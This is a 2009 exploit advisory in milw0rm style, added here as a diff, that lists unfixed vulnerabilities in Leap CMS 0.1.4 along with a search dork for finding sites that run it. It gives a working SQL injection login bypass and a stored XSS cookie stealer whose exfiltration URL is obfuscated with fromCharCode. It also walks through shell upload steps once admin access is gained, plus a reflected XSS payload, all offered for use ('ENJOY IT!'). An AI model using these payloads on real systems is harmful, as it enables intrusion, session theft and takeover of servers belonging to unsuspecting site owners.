@@ -1,0 +1,182 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	    	MULTIPLE REMOTE VULNERABILITIES		             	     |
+|--------------------------------------------------------------------------------------------|
+|                         	| 	  LEAP CMS 0.1.4       |		 	     |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: http://leap.gowondesigns.com/           				             |
+|-->DOWNLOAD: http://leap.gowondesigns.com/download.php?leap014.zip            	             |
+|-->DEMO: http://php.opensourcecms.com/scripts/details.php?scriptid=161&name=Leap	     |
+|-->CATEGORY: CMS / Lite								     |
+|-->DESCRIPTION: Leap is a single file, template independent, open-source,       	     |
+|		standards-compliant,extensible content management system for the web...      |
+|-->RELEASED: 2009-03-13								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3 and I-Explorer 6						     |
+|-->DORK: "Powered by Leap"							             |
+|-->CATEGORY: AUTH-BYPASS(SQLi)/COOKIE-STEALER (XSS)/SHELL-UPLOAD/ XSS		             |
+|-->AFFECT VERSION: 0.1.4 (maybe <= ?)				 			     |
+|-->Discovered Bug date: 2009-04-24							     |
+|-->Reported Bug date: 2009-04-24							     |
+|-->Fixed bug date: Not fixed								     |
+|-->Info patch: Not fixed							             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+##############################
+//////////////////////////////
+
+AUTHENTICATION BYPASS (SQLi):
+
+/////////////////////////////
+##############################
+
+
+<<<<---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++--------->>>>
+
+
+-----------
+FILE VULN:
+-----------
+
+
+Path --> [HOME_PATH]/leap.php
+
+
+function checkSession() {
+
+	if($_POST['login']=='Login') { 
+	
+		$_SESSION['userMail']=$_POST['email']; $_SESSION['passWord']=md5($_POST['pwd']); 
+			
+		....
+	}
+	
+	$i=@mysql_query("SELECT * FROM ".db('prefix')."users WHERE mail='$_SESSION[userMail]' AND pwd='$_SESSION[passWord]'"); $d=@mysql_fetch_array($i);
+
+		....
+
+---------
+EXPLOIT:
+---------
+
+
+Email Address: nothing' or 1=1#
+
+Password: nothing
+
+
+#############################
+/////////////////////////////
+
+COOKIES STEALING VULN (XSS):
+
+/////////////////////////////
+#############################
+
+
+<<<<---------++++++++++++++ Condition: Add comment +++++++++++++++++--------->>>>
+
+
+---------
+EXPLOIT:
+---------
+
+
+Go to Link --> http://[HOST]/[HOME_PATH]/?article.[ARTICLE_TITLE]
+
+There it can comment the article.
+
+
+Add a comment with any name/email and message:
+
+
+<script>document.location=String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,101,120,112,108,111,105,116,45,99,111,111,107,105,101,115,47,119,97,105,116,105,110,103,45,102,111,114,46,112,104,112,63,99,107,61)+document.cookie</script>
+
+
+PHP Script (Cookies Stealer) --> See: http://www.milw0rm.com/exploits/8453
+				      http://www.milw0rm.com/exploits/8471
+
+Note: Exploit fails if real admin click on log-out button.
+
+
+############################
+////////////////////////////
+
+SHELL UPLOAD VULNERABILITY:
+
+////////////////////////////
+############################
+
+
+<<<<---------++++++++++++++ Condition: Be superadmin (above) +++++++++++++++++--------->>>>
+
+
+---------
+EXPLOIT:
+---------
+
+
+Option: Manage Files. Link --> http://[HOST]/[HOME_PATH]/?admin.system.files
+
+upload your shell there.
+
+Then, Go to the link --> http://[HOST]/[HOME_PATH]/shell.php
+
+
+########################
+////////////////////////
+
+XSS (SEARCH POST FORM):
+
+////////////////////////
+########################
+
+
+Search:
+
+"><script>alert(1)</script>
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+##       GREETZ TO: JosS and all SPANISH Hack3Rs community!          ##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-04-30]
